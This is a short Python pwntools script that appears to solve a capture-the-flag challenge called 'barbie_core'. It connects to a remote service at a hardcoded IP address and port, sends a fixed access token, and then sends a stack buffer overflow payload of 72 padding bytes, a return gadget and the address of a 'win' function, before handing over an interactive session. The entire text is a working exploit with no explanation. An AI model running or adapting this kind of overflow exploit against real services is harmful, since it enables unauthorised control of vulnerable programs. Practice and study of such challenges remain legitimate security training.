from pwn import *

elf = context.binary = ELF("./barbie_core", checksec=False)

TOKEN = b"B4RB13-C0R3GL4M!"

RET = 0x40101a
WIN = 0x4013c3
OFFSET = 72

payload = flat(
    b"A" * OFFSET,
    RET,
    WIN
)

io = remote("162.243.100.178", 5000)

io.sendlineafter(b"code> ", TOKEN)
io.sendlineafter(b"pilot> ", payload)

io.interactive()